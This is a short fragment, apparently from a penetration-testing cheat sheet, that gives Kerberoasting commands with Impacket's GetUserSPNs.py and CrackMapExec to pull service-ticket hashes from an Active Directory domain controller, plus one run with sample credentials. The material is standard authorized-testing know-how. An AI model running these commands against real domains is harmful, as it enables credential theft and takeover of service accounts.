...
```bash
# Using Impacket
GetUserSPNs.py domain.local/user:password -dc-ip ${PRIVATE_IP} -request

# Using CrackMapExec
crackmapexec ldap ${PRIVATE_IP} -u 'user' -p 'pass' --kdcHost ${PRIVATE_IP} --kerberoast output.txt
```
...
$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip ${PRIVATE_IP} -request
